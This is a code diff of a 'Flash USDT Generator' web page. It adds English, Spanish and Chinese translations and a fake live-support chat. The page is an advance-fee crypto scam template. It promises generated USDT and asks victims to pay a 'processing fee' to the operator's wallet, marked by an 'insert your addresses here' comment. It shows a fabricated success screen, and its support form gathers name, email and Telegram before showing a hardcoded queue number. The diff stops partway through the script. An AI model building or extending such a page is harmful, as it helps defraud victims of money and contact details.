@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash USDT Generator - Футуристический генератор</title>
+    <title>Flash USDT Generator - Futuristic Generator</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -79,6 +79,378 @@
             padding: 20px;
             position: relative;
             z-index: 10;
+        }
+
+        /* Language Switcher */
+        .language-switcher {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            gap: 10px;
+            background: var(--card-bg);
+            padding: 12px 18px;
+            border-radius: 12px;
+            border: 2px solid rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+        }
+
+        .lang-btn {
+            padding: 8px 16px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.85rem;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 8px;
+            color: rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .lang-btn:hover {
+            background: rgba(0, 255, 65, 0.2);
+            border-color: var(--neon-green);
+            color: #ffffff;
+        }
+
+        .lang-btn.active {
+            background: var(--neon-green);
+            color: #000;
+            border-color: var(--neon-green);
+            font-weight: 700;
+        }
+
+        /* Support Button */
+        .support-button {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 65px;
+            height: 65px;
+            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 5px 30px rgba(0, 255, 255, 0.5);
+            z-index: 1000;
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                box-shadow: 0 5px 30px rgba(0, 255, 255, 0.5);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 8px 40px rgba(0, 255, 255, 0.8);
+            }
+        }
+
+        .support-button:hover {
+            transform: scale(1.1);
+        }
+
+        .support-button::before {
+            content: '💬';
+            font-size: 2rem;
+        }
+
+        /* Support Chat Modal */
+        .chat-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 2000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .chat-overlay.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .chat-container {
+            background: var(--card-bg);
+            border: 3px solid var(--neon-cyan);
+            border-radius: 20px;
+            width: 100%;
+            max-width: 500px;
+            max-height: 700px;
+            display: flex;
+            flex-direction: column;
+            animation: slideInUp 0.4s ease;
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .chat-header {
+            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
+            padding: 20px;
+            border-radius: 17px 17px 0 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .chat-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            color: #000;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .chat-close {
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.5rem;
+            color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .chat-close:hover {
+            background: rgba(0, 0, 0, 0.5);
+            transform: rotate(90deg);
+        }
+
+        .chat-messages {
+            flex: 1;
+            padding: 25px;
+            overflow-y: auto;
+            max-height: 400px;
+        }
+
+        .message {
+            margin-bottom: 20px;
+            animation: messageSlide 0.3s ease;
+        }
+
+        @keyframes messageSlide {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message.bot {
+            text-align: left;
+        }
+
+        .message.user {
+            text-align: right;
+        }
+
+        .message-bubble {
+            display: inline-block;
+            padding: 12px 18px;
+            border-radius: 15px;
+            max-width: 80%;
+            word-wrap: break-word;
+        }
+
+        .message.bot .message-bubble {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            color: #ffffff;
+        }
+
+        .message.user .message-bubble {
+            background: linear-gradient(135deg, var(--neon-green), var(--neon-cyan));
+            color: #000;
+            font-weight: 600;
+        }
+
+        .message-time {
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 5px;
+        }
+
+        /* Contact Form */
+        .contact-form {
+            padding: 25px;
+            display: none;
+        }
+
+        .contact-form.active {
+            display: block;
+        }
+
+        .form-field {
+            margin-bottom: 20px;
+        }
+
+        .form-field label {
+            display: block;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9rem;
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .form-field input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 10px;
+            color: #ffffff;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1rem;
+        }
+
+        .form-field input:focus {
+            outline: none;
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+
+        .submit-contact-btn {
+            width: 100%;
+            padding: 15px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .submit-contact-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 255, 255, 0.5);
+        }
+
+        /* Queue Screen */
+        .queue-screen {
+            padding: 40px 25px;
+            text-align: center;
+            display: none;
+        }
+
+        .queue-screen.active {
+            display: block;
+        }
+
+        .queue-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: rotate 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .queue-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            color: var(--neon-cyan);
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .queue-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3rem;
+            color: var(--neon-green);
+            font-weight: 900;
+            margin: 20px 0;
+        }
+
+        .queue-text {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+
+        /* Chat Input */
+        .chat-input-area {
+            padding: 20px;
+            border-top: 1px solid rgba(0, 255, 255, 0.2);
+        }
+
+        .chat-input-wrapper {
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-input {
+            flex: 1;
+            padding: 12px 15px;
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 10px;
+            color: #ffffff;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1rem;
+        }
+
+        .chat-input:focus {
+            outline: none;
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+
+        .chat-send-btn {
+            padding: 12px 20px;
+            background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .chat-send-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.5);
         }
 
         /* Header */
@@ -899,11 +1271,6 @@
             animation: rotate 15s linear infinite;
         }
 
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
         .info-card:hover {
             transform: translateY(-10px);
             box-shadow: 0 15px 50px rgba(0, 255, 65, 0.3);
@@ -993,16 +1360,105 @@
             .badge {
                 padding: 12px 18px;
             }
+
+            .language-switcher {
+                right: 10px;
+                top: 10px;
+                padding: 10px 12px;
+            }
+
+            .lang-btn {
+                padding: 6px 12px;
+                font-size: 0.75rem;
+            }
+
+            .support-button {
+                width: 55px;
+                height: 55px;
+                bottom: 20px;
+                right: 20px;
+            }
+
+            .support-button::before {
+                font-size: 1.5rem;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Language Switcher -->
+    <div class="language-switcher">
+        <button class="lang-btn active" onclick="changeLanguage('en')" data-lang="en">EN</button>
+        <button class="lang-btn" onclick="changeLanguage('ru')" data-lang="ru">RU</button>
+        <button class="lang-btn" onclick="changeLanguage('es')" data-lang="es">ES</button>
+        <button class="lang-btn" onclick="changeLanguage('zh')" data-lang="zh">中文</button>
+    </div>
+
+    <!-- Support Button -->
+    <div class="support-button" onclick="openSupport()"></div>
+
+    <!-- Support Chat Modal -->
+    <div class="chat-overlay" id="chatOverlay">
+        <div class="chat-container">
+            <div class="chat-header">
+                <div class="chat-title" data-translate="support_title">24/7 Support</div>
+                <button class="chat-close" onclick="closeSupport()">✕</button>
+            </div>
+            
+            <div class="chat-messages" id="chatMessages">
+                <div class="message bot">
+                    <div class="message-bubble" data-translate="support_welcome">
+                        Hello! Welcome to Flash USDT Generator support. How can we help you today?
+                    </div>
+                    <div class="message-time">Just now</div>
+                </div>
+            </div>
+
+            <!-- Contact Form -->
+            <div class="contact-form" id="contactForm">
+                <div class="form-field">
+                    <label data-translate="support_name">Your Name</label>
+                    <input type="text" id="supportName" required>
+                </div>
+                <div class="form-field">
+                    <label data-translate="support_email">Email Address</label>
+                    <input type="email" id="supportEmail" required>
+                </div>
+                <div class="form-field">
+                    <label data-translate="support_telegram">Telegram (Optional)</label>
+                    <input type="text" id="supportTelegram" placeholder="@username">
+                </div>
+                <button class="submit-contact-btn" onclick="submitContactInfo()" data-translate="support_submit">
+                    Submit Information
+                </button>
+            </div>
+
+            <!-- Queue Screen -->
+            <div class="queue-screen" id="queueScreen">
+                <div class="queue-icon">⏳</div>
+                <div class="queue-title" data-translate="queue_title">In Queue</div>
+                <div class="queue-number" id="queueNumber">42</div>
+                <div class="queue-text" data-translate="queue_text">
+                    Our support team is currently busy. You are in the queue. 
+                    A support agent will be with you shortly. Thank you for your patience!
+                </div>
+            </div>
+
+            <div class="chat-input-area" id="chatInputArea">
+                <div class="chat-input-wrapper">
+                    <input type="text" class="chat-input" id="chatInput" data-translate-placeholder="type_message" placeholder="Type your message...">
+                    <button class="chat-send-btn" onclick="sendMessage()">➤</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div class="container">
         <!-- Header -->
         <header>
             <h1 class="logo">FLASH USDT</h1>
-            <p class="subtitle">Футуристический генератор</p>
-            <p class="tagline">Powered by Next-Gen Blockchain Technology</p>
+            <p class="subtitle" data-translate="subtitle">Futuristic Generator</p>
+            <p class="tagline" data-translate="tagline">Powered by Next-Gen Blockchain Technology</p>
         </header>
 
         <!-- Security Badges -->
@@ -1040,26 +1496,26 @@
         <!-- Wallet Connection Bar -->
         <div class="wallet-bar">
             <div class="wallet-status">
-                <div class="wallet-label">Статус кошелька</div>
-                <div class="wallet-address" id="walletAddress">Не подключен</div>
+                <div class="wallet-label" data-translate="wallet_status">Wallet Status</div>
+                <div class="wallet-address" id="walletAddress" data-translate="not_connected">Not Connected</div>
             </div>
             <div style="display: flex; gap: 10px; align-items: center;">
                 <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
-                    🔗 Подключить кошелек
+                    <span data-translate="connect_wallet">🔗 Connect Wallet</span>
                 </button>
                 <button class="disconnect-btn" id="disconnectBtn" onclick="disconnectWallet()" style="display: none;">
-                    ✕ Отключить
+                    <span data-translate="disconnect">✕ Disconnect</span>
                 </button>
             </div>
         </div>
 
         <!-- Main Generator Card -->
         <div class="main-card">
-            <h2 class="section-title">⚡ Генератор Flash USDT</h2>
+            <h2 class="section-title" data-translate="generator_title">⚡ Flash USDT Generator</h2>
             
             <!-- Amount Section -->
             <div class="amount-section">
-                <div class="amount-label">Введите количество USDT</div>
+                <div class="amount-label" data-translate="enter_amount">Enter USDT Amount</div>
                 <div class="amount-input-wrapper">
                     <input type="number" class="amount-input" id="amountInput" 
                            placeholder="0.00" step="1" min="1" value="10000">
@@ -1072,7 +1528,7 @@
                     <button class="quick-btn" onclick="setAmount(100000)">100,000 USDT</button>
                 </div>
                 <div class="commission-info" id="commissionInfo">
-                    <div class="commission-text">Комиссия за обработку:</div>
+                    <div class="commission-text" data-translate="processing_fee">Processing Fee:</div>
                     <div class="commission-amount" id="commissionAmount">50 USDT</div>
                 </div>
             </div>
@@ -1080,13 +1536,13 @@
             <form id="generatorForm">
                 <div class="form-group">
                     <label class="form-label" for="recipientAddress">
-                        Адрес получателя <span class="required">*</span>
+                        <span data-translate="recipient_address">Recipient Address</span> <span class="required">*</span>
                     </label>
-                    <input type="text" id="recipientAddress" placeholder="0x... (обязательное поле)" required>
+                    <input type="text" id="recipientAddress" data-translate-placeholder="recipient_placeholder" placeholder="0x... (required field)" required>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="network">Выберите сеть</label>
+                    <label class="form-label" for="network" data-translate="select_network">Select Network</label>
                     <select id="network">
                         <option value="ethereum">Ethereum (ERC-20)</option>
                         <option value="bsc">Binance Smart Chain (BEP-20)</option>
@@ -1098,32 +1554,32 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="duration">Длительность Flash</label>
+                    <label class="form-label" for="duration" data-translate="flash_duration">Flash Duration</label>
                     <select id="duration">
-                        <option value="30">30 минут</option>
-                        <option value="60">1 час</option>
-                        <option value="120">2 часа</option>
-                        <option value="360">6 часов</option>
-                        <option value="720">12 часов</option>
-                        <option value="1440">24 часа</option>
+                        <option value="30">30 minutes</option>
+                        <option value="60">1 hour</option>
+                        <option value="120">2 hours</option>
+                        <option value="360">6 hours</option>
+                        <option value="720">12 hours</option>
+                        <option value="1440">24 hours</option>
                     </select>
                 </div>
 
                 <button type="submit" class="generate-btn" id="generateBtn">
-                    <span>⚡ СГЕНЕРИРОВАТЬ FLASH USDT</span>
+                    <span data-translate="generate_btn">⚡ GENERATE FLASH USDT</span>
                 </button>
             </form>
 
             <!-- Loading -->
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                <div class="loading-text">Генерация транзакции...</div>
+                <div class="loading-text" data-translate="generating">Generating transaction...</div>
             </div>
 
             <!-- Result Section -->
             <div class="result-section" id="resultSection">
                 <div class="success-icon">✓</div>
-                <div class="success-title">Flash USDT успешно сгенерирован!</div>
+                <div class="success-title" data-translate="success_title">Flash USDT Successfully Generated!</div>
                 
                 <div class="result-item">
                     <div class="result-label">Transaction Hash</div>
@@ -1131,22 +1587,22 @@
                 </div>
                 
                 <div class="result-item">
-                    <div class="result-label">Сумма</div>
+                    <div class="result-label" data-translate="amount">Amount</div>
                     <div class="result-value" id="txAmount"></div>
                 </div>
                 
                 <div class="result-item">
-                    <div class="result-label">Адрес получателя</div>
+                    <div class="result-label" data-translate="recipient">Recipient Address</div>
                     <div class="result-value" id="txRecipient"></div>
                 </div>
                 
                 <div class="result-item">
-                    <div class="result-label">Сеть</div>
+                    <div class="result-label" data-translate="network">Network</div>
                     <div class="result-value" id="txNetwork"></div>
                 </div>
                 
                 <div class="result-item">
-                    <div class="result-label">Время действия</div>
+                    <div class="result-label" data-translate="duration">Duration</div>
                     <div class="result-value" id="txDuration"></div>
                 </div>
             </div>
@@ -1156,26 +1612,26 @@
         <div class="info-grid">
             <div class="info-card">
                 <div class="info-icon">⚡</div>
-                <h3 class="info-title">Мгновенная генерация</h3>
-                <p class="info-description">Flash USDT генерируются мгновенно и отображаются в вашем кошельке в течение секунд</p>
+                <h3 class="info-title" data-translate="feature1_title">Instant Generation</h3>
+                <p class="info-description" data-translate="feature1_desc">Flash USDT is generated instantly and appears in your wallet within seconds</p>
             </div>
 
             <div class="info-card">
                 <div class="info-icon">🌐</div>
-                <h3 class="info-title">Мульти-сеть</h3>
-                <p class="info-description">Поддержка Ethereum, BSC, Polygon, Arbitrum, Optimism и Tron блокчейнов</p>
+                <h3 class="info-title" data-translate="feature2_title">Multi-Network</h3>
+                <p class="info-description" data-translate="feature2_desc">Support for Ethereum, BSC, Polygon, Arbitrum, Optimism and Tron blockchains</p>
             </div>
 
             <div class="info-card">
                 <div class="info-icon">🔒</div>
-                <h3 class="info-title">Безопасность</h3>
-                <p class="info-description">Используем передовые протоколы шифрования для защиты ваших транзакций</p>
+                <h3 class="info-title" data-translate="feature3_title">Security</h3>
+                <p class="info-description" data-translate="feature3_desc">We use advanced encryption protocols to protect your transactions</p>
             </div>
 
             <div class="info-card">
                 <div class="info-icon">⏱️</div>
-                <h3 class="info-title">Гибкая длительность</h3>
-                <p class="info-description">Настраиваемое время действия Flash USDT от 30 минут до 24 часов</p>
+                <h3 class="info-title" data-translate="feature4_title">Flexible Duration</h3>
+                <p class="info-description" data-translate="feature4_desc">Customizable Flash USDT lifetime from 30 minutes to 24 hours</p>
             </div>
         </div>
     </div>
@@ -1184,36 +1640,36 @@
     <div class="modal-overlay" id="feeModal">
         <div class="fee-modal">
             <div class="fee-icon">💳</div>
-            <h2 class="fee-title">Оплата комиссии</h2>
-            <p class="fee-description">
-                Для завершения генерации Flash USDT необходимо внести комиссию за обработку транзакции. 
-                Это обязательный платеж для активации смарт-контракта в блокчейне.
+            <h2 class="fee-title" data-translate="fee_title">Fee Payment</h2>
+            <p class="fee-description" data-translate="fee_description">
+                To complete the Flash USDT generation, you need to pay the processing fee. 
+                This is a mandatory payment to activate the smart contract on the blockchain.
             </p>
 
             <div class="fee-details">
                 <div class="fee-row">
-                    <span class="fee-label">Сумма Flash USDT:</span>
+                    <span class="fee-label" data-translate="flash_amount">Flash USDT Amount:</span>
                     <span class="fee-value" id="modalAmount">10,000 USDT</span>
                 </div>
                 <div class="fee-row">
-                    <span class="fee-label">Сеть:</span>
+                    <span class="fee-label" data-translate="network">Network:</span>
                     <span class="fee-value" id="modalNetwork">Ethereum</span>
                 </div>
                 <div class="fee-row">
-                    <span class="fee-label">Комиссия за обработку:</span>
+                    <span class="fee-label" data-translate="processing_fee">Processing Fee:</span>
                     <span class="fee-value total" id="modalFee">50 USDT</span>
                 </div>
             </div>
 
             <div class="wallet-input-section">
-                <label class="wallet-input-label">Отправьте комиссию на этот адрес:</label>
-                <!-- МЕСТО ДЛЯ ВАШЕГО КОШЕЛЬКА - ВСТАВЬТЕ СЮДА ВАШИ АДРЕСА -->
+                <label class="wallet-input-label" data-translate="send_fee">Send fee to this address:</label>
+                <!-- PLACE FOR YOUR WALLETS - INSERT YOUR ADDRESSES HERE -->
                 <input type="text" class="wallet-input" id="paymentAddress" value="0xYOUR_WALLET_ADDRESS_HERE" readonly>
-                <button class="copy-btn" onclick="copyAddress()">📋 Копировать адрес</button>
+                <button class="copy-btn" onclick="copyAddress()" data-translate="copy_address">📋 Copy Address</button>
             </div>
 
-            <button class="pay-btn" onclick="confirmPayment()">
-                ✓ Я ОПЛАТИЛ КОМИССИЮ
+            <button class="pay-btn" onclick="confirmPayment()" data-translate="paid_btn">
+                ✓ I PAID THE FEE
             </button>
         </div>
     </div>
@@ -1224,6 +1680,199 @@
     </footer>
 
     <script>
+        // Translations
+        const translations = {
+            en: {
+                subtitle: "Futuristic Generator",
+                tagline: "Powered by Next-Gen Blockchain Technology",
+                wallet_status: "Wallet Status",
+                not_connected: "Not Connected",
+                connect_wallet: "🔗 Connect Wallet",
+                disconnect: "✕ Disconnect",
+                connected: "✓ Wallet Connected",
+                generator_title: "⚡ Flash USDT Generator",
+                enter_amount: "Enter USDT Amount",
+                processing_fee: "Processing Fee:",
+                recipient_address: "Recipient Address",
+                recipient_placeholder: "0x... (required field)",
+                select_network: "Select Network",
+                flash_duration: "Flash Duration",
+                generate_btn: "⚡ GENERATE FLASH USDT",
+                generating: "Generating transaction...",
+                success_title: "Flash USDT Successfully Generated!",
+                amount: "Amount",
+                recipient: "Recipient Address",
+                network: "Network",
+                duration: "Duration",
+                feature1_title: "Instant Generation",
+                feature1_desc: "Flash USDT is generated instantly and appears in your wallet within seconds",
+                feature2_title: "Multi-Network",
+                feature2_desc: "Support for Ethereum, BSC, Polygon, Arbitrum, Optimism and Tron blockchains",
+                feature3_title: "Security",
+                feature3_desc: "We use advanced encryption protocols to protect your transactions",
+                feature4_title: "Flexible Duration",
+                feature4_desc: "Customizable Flash USDT lifetime from 30 minutes to 24 hours",
+                fee_title: "Fee Payment",
+                fee_description: "To complete the Flash USDT generation, you need to pay the processing fee. This is a mandatory payment to activate the smart contract on the blockchain.",
+                flash_amount: "Flash USDT Amount:",
+                send_fee: "Send fee to this address:",
+                copy_address: "📋 Copy Address",
+                paid_btn: "✓ I PAID THE FEE",
+                support_title: "24/7 Support",
+                support_welcome: "Hello! Welcome to Flash USDT Generator support. How can we help you today?",
+                support_name: "Your Name",
+                support_email: "Email Address",
+                support_telegram: "Telegram (Optional)",
+                support_submit: "Submit Information",
+                type_message: "Type your message...",
+                queue_title: "In Queue",
+                queue_text: "Our support team is currently busy. You are in the queue. A support agent will be with you shortly. Thank you for your patience!",
+                awaiting_payment: "Awaiting payment confirmation..."
+            },
+            ru: {
+                subtitle: "Футуристический генератор",
+                tagline: "Powered by Next-Gen Blockchain Technology",
+                wallet_status: "Статус кошелька",
+                not_connected: "Не подключен",
+                connect_wallet: "🔗 Подключить кошелек",
+                disconnect: "✕ Отключить",
+                connected: "✓ Кошелек подключен",
+                generator_title: "⚡ Генератор Flash USDT",
+                enter_amount: "Введите количество USDT",
+                processing_fee: "Комиссия за обработку:",
+                recipient_address: "Адрес получателя",
+                recipient_placeholder: "0x... (обязательное поле)",
+                select_network: "Выберите сеть",
+                flash_duration: "Длительность Flash",
+                generate_btn: "⚡ СГЕНЕРИРОВАТЬ FLASH USDT",
+                generating: "Генерация транзакции...",
+                success_title: "Flash USDT успешно сгенерирован!",
+                amount: "Сумма",
+                recipient: "Адрес получателя",
+                network: "Сеть",
+                duration: "Длительность",
+                feature1_title: "Мгновенная генерация",
+                feature1_desc: "Flash USDT генерируются мгновенно и отображаются в вашем кошельке в течение секунд",
+                feature2_title: "Мульти-сеть",
+                feature2_desc: "Поддержка Ethereum, BSC, Polygon, Arbitrum, Optimism и Tron блокчейнов",
+                feature3_title: "Безопасность",
+                feature3_desc: "Используем передовые протоколы шифрования для защиты ваших транзакций",
+                feature4_title: "Гибкая длительность",
+                feature4_desc: "Настраиваемое время действия Flash USDT от 30 минут до 24 часов",
+                fee_title: "Оплата комиссии",
+                fee_description: "Для завершения генерации Flash USDT необходимо внести комиссию за обработку транзакции. Это обязательный платеж для активации смарт-контракта в блокчейне.",
+                flash_amount: "Сумма Flash USDT:",
+                send_fee: "Отправьте комиссию на этот адрес:",
+                copy_address: "📋 Копировать адрес",
+                paid_btn: "✓ Я ОПЛАТИЛ КОМИССИЮ",
+                support_title: "Поддержка 24/7",
+                support_welcome: "Здравствуйте! Добро пожаловать в поддержку Flash USDT Generator. Чем мы можем вам помочь?",
+                support_name: "Ваше имя",
+                support_email: "Email адрес",
+                support_telegram: "Telegram (необязательно)",
+                support_submit: "Отправить информацию",
+                type_message: "Введите сообщение...",
+                queue_title: "В очереди",
+                queue_text: "Наша служба поддержки сейчас занята. Вы находитесь в очереди. Агент поддержки свяжется с вами в ближайшее время. Спасибо за ваше терпение!",
+                awaiting_payment: "Ожидание подтверждения оплаты..."
+            },
+            es: {
+                subtitle: "Generador Futurista",
+                tagline: "Impulsado por tecnología Blockchain de próxima generación",
+                wallet_status: "Estado de Cartera",
+                not_connected: "No Conectado",
+                connect_wallet: "🔗 Conectar Cartera",
+                disconnect: "✕ Desconectar",
+                connected: "✓ Cartera Conectada",
+                generator_title: "⚡ Generador Flash USDT",
+                enter_amount: "Ingrese Cantidad USDT",
+                processing_fee: "Tarifa de Procesamiento:",
+                recipient_address: "Dirección del Destinatario",
+                recipient_placeholder: "0x... (campo obligatorio)",
+                select_network: "Seleccione Red",
+                flash_duration: "Duración Flash",
+                generate_btn: "⚡ GENERAR FLASH USDT",
+                generating: "Generando transacción...",
+                success_title: "¡Flash USDT Generado Exitosamente!",
+                amount: "Cantidad",
+                recipient: "Dirección del Destinatario",
+                network: "Red",
+                duration: "Duración",
+                feature1_title: "Generación Instantánea",
+                feature1_desc: "Flash USDT se genera instantáneamente y aparece en su cartera en segundos",
+                feature2_title: "Multi-Red",
+                feature2_desc: "Soporte para blockchains Ethereum, BSC, Polygon, Arbitrum, Optimism y Tron",
+                feature3_title: "Seguridad",
+                feature3_desc: "Utilizamos protocolos de encriptación avanzados para proteger sus transacciones",
+                feature4_title: "Duración Flexible",
+                feature4_desc: "Tiempo de vida personalizable de Flash USDT de 30 minutos a 24 horas",
+                fee_title: "Pago de Tarifa",
+                fee_description: "Para completar la generación de Flash USDT, debe pagar la tarifa de procesamiento. Este es un pago obligatorio para activar el contrato inteligente en la blockchain.",
+                flash_amount: "Cantidad Flash USDT:",
+                send_fee: "Enviar tarifa a esta dirección:",
+                copy_address: "📋 Copiar Dirección",
+                paid_btn: "✓ PAGUÉ LA TARIFA",
+                support_title: "Soporte 24/7",
+                support_welcome: "¡Hola! Bienvenido al soporte de Flash USDT Generator. ¿Cómo podemos ayudarle hoy?",
+                support_name: "Su Nombre",
+                support_email: "Dirección de Email",
+                support_telegram: "Telegram (Opcional)",
+                support_submit: "Enviar Información",
+                type_message: "Escribe tu mensaje...",
+                queue_title: "En Cola",
+                queue_text: "Nuestro equipo de soporte está ocupado actualmente. Está en la cola. Un agente de soporte estará con usted en breve. ¡Gracias por su paciencia!",
+                awaiting_payment: "Esperando confirmación de pago..."
+            },
+            zh: {
+                subtitle: "未来派生成器",
+                tagline: "由下一代区块链技术驱动",
+                wallet_status: "钱包状态",
+                not_connected: "未连接",
+                connect_wallet: "🔗 连接钱包",
+                disconnect: "✕ 断开连接",
+                connected: "✓ 钱包已连接",
+                generator_title: "⚡ Flash USDT 生成器",
+                enter_amount: "输入 USDT 数量",
+                processing_fee: "处理费用：",
+                recipient_address: "接收地址",
+                recipient_placeholder: "0x... (必填字段)",
+                select_network: "选择网络",
+                flash_duration: "Flash 持续时间",
+                generate_btn: "⚡ 生成 FLASH USDT",
+                generating: "生成交易中...",
+                success_title: "Flash USDT 生成成功！",
+                amount: "金额",
+                recipient: "接收地址",
+                network: "网络",
+                duration: "持续时间",
+                feature1_title: "即时生成",
+                feature1_desc: "Flash USDT 即时生成并在几秒钟内出现在您的钱包中",
+                feature2_title: "多网络",
+                feature2_desc: "支持 Ethereum、BSC、Polygon、Arbitrum、Optimism 和 Tron 区块链",
+                feature3_title: "安全性",
+                feature3_desc: "我们使用先进的加密协议来保护您的交易",
+                feature4_title: "灵活的持续时间",
+                feature4_desc: "可自定义的 Flash USDT 生命周期，从 30 分钟到 24 小时",
+                fee_title: "费用支付",
+                fee_description: "要完成 Flash USDT 生成，您需要支付处理费用。这是激活区块链智能合约的强制性付款。",
+                flash_amount: "Flash USDT 金额：",
+                send_fee: "将费用发送到此地址：",
+                copy_address: "📋 复制地址",
+                paid_btn: "✓ 我已支付费用",
+                support_title: "24/7 支持",
+                support_welcome: "您好！欢迎来到 Flash USDT Generator 支持。我们今天能为您提供什么帮助？",
+                support_name: "您的姓名",
+                support_email: "电子邮件地址",
+                support_telegram: "Telegram（可选）",
+                support_submit: "提交信息",
+                type_message: "输入您的消息...",
+                queue_title: "排队中",
+                queue_text: "我们的支持团队目前很忙。您在队列中。支持代理将很快与您联系。感谢您的耐心！",
+                awaiting_payment: "等待付款确认..."
+            }
+        };
+
+        let currentLang = 'en';
         let isWalletConnected = false;
         let userAddress = '';
         let currentAmount = 10000;
@@ -1231,16 +1880,108 @@
         let currentDuration = '30';
         let currentRecipient = '';
 
+        // Change Language
+        function changeLanguage(lang) {
+            currentLang = lang;
+            
+            // Update active button
+            document.querySelectorAll('.lang-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.getAttribute('data-lang') === lang) {
+                    btn.classList.add('active');
+                }
+            });
+
+            // Translate all elements
+            document.querySelectorAll('[data-translate]').forEach(elem => {
+                const key = elem.getAttribute('data-translate');
+                if (translations[lang][key]) {
+                    elem.textContent = translations[lang][key];
+                }
+            });
+
+            // Translate placeholders
+            document.querySelectorAll('[data-translate-placeholder]').forEach(elem => {
+                const key = elem.getAttribute('data-translate-placeholder');
+                if (translations[lang][key]) {
+                    elem.placeholder = translations[lang][key];
+                }
+            });
+
+            // Update button content if wallet is connected
+            if (isWalletConnected) {
+                document.getElementById('connectBtn').innerHTML = translations[lang]['connected'];
+            }
+        }
+
+        // Support Chat Functions
+        function openSupport() {
+            document.getElementById('chatOverlay').classList.add('active');
+        }
+
